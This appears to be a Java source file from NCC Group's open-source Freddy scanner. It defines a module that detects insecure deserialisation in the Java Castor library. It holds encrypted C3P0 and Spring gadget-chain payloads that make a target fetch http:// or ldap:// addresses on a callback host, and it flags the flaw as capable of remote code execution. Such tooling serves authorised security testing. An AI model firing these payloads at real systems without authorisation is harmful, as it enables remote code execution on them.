// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the Java Castor library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class CastorModule extends FreddyModuleBase {
    //C3P0WrapperConnPool payload data
    private final String C3P0WRAP_PREFIX = decrypt("RYjDM5nBbHO7i03MZAsUZfKYoQ9oYUZTxrJZDF20UR2BwoBnEyt7tKgpkfQoHLXlycrjRmMtCu/XCtZ/4KN95gGMDgsK6qh8t1oykZ/PQGyhOCvQKWARdEtvseyFqLZ2mm+vtft9TVf/x4mATihIuGNzHuZ9pm4YTY3qEZ+eCdmdtPikDIQ8MTUnXEf3Uj6WF4IkfaaLZzQsgkQyUFLluw0uT/xEru0baYKSHIMDtwXm8tkSbQlz8tKoAoOZ4tP5hHRUD/PpM1aK7TiO0x5O6oks72kaYUjX9l7Hidf8ajAnmHYAXN3i0xpThLnDKFkd42ZNXC7gBUTV7V1iKFn43YyO3Y6viFSfIf8G3HajDJZ/8oFBmySvXRCipec5Ysb2Pz9bXHgnmIyK355UE9X2oAHJVwrEAxbZgx2nb5RTtZ7p0ssRsfPCBOO5cU8RVOytjdNlwn86aLgmpjptqPremPmk2ojxbOk3d1uxKj6ksxNqJfCeJuqu/uDyffgT4oKe6pQAEydL8mQLEyA7vBeffiRpH/Y5Sth4ozswdEC5YAu7VZK/9RQppV9NtIvqvXt02wysFktn6oBI15YsTntADBVLpFDsaBrG9/XKp56IQQwv+tKd0/SwjDb0ZD1ml12CniGy3Yfv61zi10RbPUmRPi/pnY/C/5tAA34n9ulW5S3z1N5IB/zGDSSJmp/v3L80ff3b1Y4x3nPRXTemUO0rw+grOfADt54JBrU/ya++zb7hKmTueFJ+eMZVZ8e+aE6tYQZZVklA0Ky9exIXkxhlgSuYsOYbbRT87hNCO4DoPDgWgAE70NQQa3In5OOEv9PegejhlwpsqPshLHf3bH+I7WEGWVZJQNCsvXsSF5MYZYFR5nZ9Hvif6zI4T4u7Ebg7ZA22UTmL7X5xAjmHyUmtPS2wBpCZKMpRq7pJyt1ReuvGrY3CpVAVFMWQi4vRoS4R2B0HpnJOGXoa/Chijlxb7EakB0TkajZ1Tn8p5x59mBj80KW7PJc9Gsb7ReXxWf7nc51ew6NcZTAz2H0vByyy20qvmI/9y9MWsJTaiu9/3dIvS+vU69RJNJt7ivg5wuRGQ6Ln3dhiAiYyW5vOHnrOd8SevzHR5RHCI4DLhttUFlTWqteAxwG2uW7cZnx0Zgr8/Dntf1/kXhu75EImsMkBy5EBGqyjwYNnhDfJOJFs/V6Jeb2kXt5soOEdX8op813bFHsGh9cV8w65uupM/UO1QRNJjWlWEeccTL+NGefF61Po150ham/PMLsd3blnUsdI2wVEG7cAoh7VRPkt7++088Gi94P6IkGGj8fSQg7KsiIJb/cEWaCijHelXyixwZr42VEHbetEbo9Y927S2YX7HDVvInXPNuCy9PImU2q8hdlJe2x/N1YaXK89AOKuanPZpN54FpkBY1SX2IB5oS5bKy+Hln2ZHCqSpmoX5yZ8Lvhl3ZJJYLEdd2ce6vXBkheyo1ZU3cU6qY5pTyIVYoXYDdys1qbYvJfTXXlz2Hbnyg75rqhBU6uPvPgE6DGa0hvxofGfNFESKjaKj2DwXR+jv+Xn40nNsc7x0IlkIIHgrkMBzM2MBdVMguPS8BQmkEqEyviE2KJaz88smhg+CrkkMsqkc+2A6bYV1fhdJCOqZBBJNm8CmIA6nj1dDBvQQhHV1IU7i6nyqq2Cu58osXq+WQ==");
    private final String C3P0WRAP_SUFFIX = decrypt("nWkxtD6maqTrfCzrfpD0wuUQDSdLJvvUqQt6azSACoE=");

    //SpringPropertyPathFactory payload data
    private final String SPPF_PREFIX = decrypt("RYjDM5nBbHO7i03MZAsUZfKYoQ9oYUZTxrJZDF20UR2BwoBnEyt7tKgpkfQoHLXlycrjRmMtCu/XCtZ/4KN95gGMDgsK6qh8t1oykZ/PQGyhOCvQKWARdEtvseyFqLZ2X0wSMgnmVnbZHkT8xk1r6ZRYJgIGoh/vbEfIHq37ipb3/D4TkirHPBY321CUt5VUccvAKN1TpuR0KcWGFUH7nNYw9cl6ciRkUAbN3UBvEPwcBoLm2IfKUFU4WrwFchLS");
    private final String SPPF_MIDDLE = decrypt("cWCD68K2tA9zqjuARTmZZaUQol5NDJpa2O6L2Ug2WRFI79E3KVfTRScDT1ilBEah6S8H3ap/OEmMOBCrsCLoAyYu18bwepRemJ0vYz5bOcoioHOiOZDVklBf212rmPMTHePOrr3Ft9YHELvcE3hNGYylV/Hgzuo4XYsZzRwStKxfWzoq3X9N4tVZXwSZACxAcMMnBB5stFUrmgef2K6VEw==");
    private final String SPPF_SUFFIX = decrypt("lT0Kq201roJBvFSjfnUCh4K253PH00Va4ttnDTvBMzQ5shIuW9GShW0dpgaZzhep");

    protected void initialiseModule() {
        setName("Castor");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(Pattern.compile("xsi((:)|(%3A)|(%3a))type((=)|(%3D)|(%3d))((\")|(%22))"), IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("org.exolab.castor.xml.MarshalException", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("<x type=\"FreddyDeser\"></x>", Pattern.compile("The class for the root element ((')|(&#39;))x((')|(&#39;)) could not be found\\."));

        registerActiveScanCollaboratorPayload(PN_C3P0WCP, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGPPF, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0WCP:
                return C3P0WRAP_PREFIX + encodeStringToAsciiHex(padString("http://" + hostname + "/", 200)) + C3P0WRAP_SUFFIX;

            case PN_SPRINGPPF:
                return SPPF_PREFIX + "ldap://" + hostname + "/" + SPPF_MIDDLE + "ldap://" + hostname + "/" + SPPF_SUFFIX;
        }
        return null;
    }
}
